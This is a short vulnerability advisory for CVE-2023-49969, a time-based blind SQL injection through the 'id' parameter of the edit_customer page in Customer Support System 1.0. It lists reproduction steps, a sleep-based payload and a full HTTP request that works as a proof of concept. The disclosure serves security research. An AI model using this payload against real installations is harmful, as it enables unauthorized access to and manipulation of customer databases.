# CVE-2023-49969
# Customer Support System 1.0 - SQL Injection Vulnerability in edit_customer via "id" URL Parameter

**Description**: A SQL Injection vulnerability exists in version 1 of the Customer Support System. An attacker with malicious intent can execute SQL commands on the MySQL database by manipulating the 'id' URL parameter while editing a customer.
  
**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49969  
**Tested on**: Windows  
### Steps to reproduce:  
1- Log in to the application.  
2- Navigate to the customer_list page, click the "Action" button, and select "Edit".  
3- The 'id' parameter will be passed, allowing the insertion of a malicious payload.  
**payload**: (select*from(select(sleep(5)))a)  
### Request

```
GET /customer_support/index.php?page=edit_customer&id=(select*from(select(sleep(5)))a HTTP/1.1
Host: 192.168.68.182
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://192.168.68.182/customer_support/index.php?page=customer_list
Cookie: PHPSESSID=arlocktakq815fq1lpm5fjml9n
Upgrade-Insecure-Requests: 1
```
Discoverer(s)/Credits:  
Geraldo Alcântara
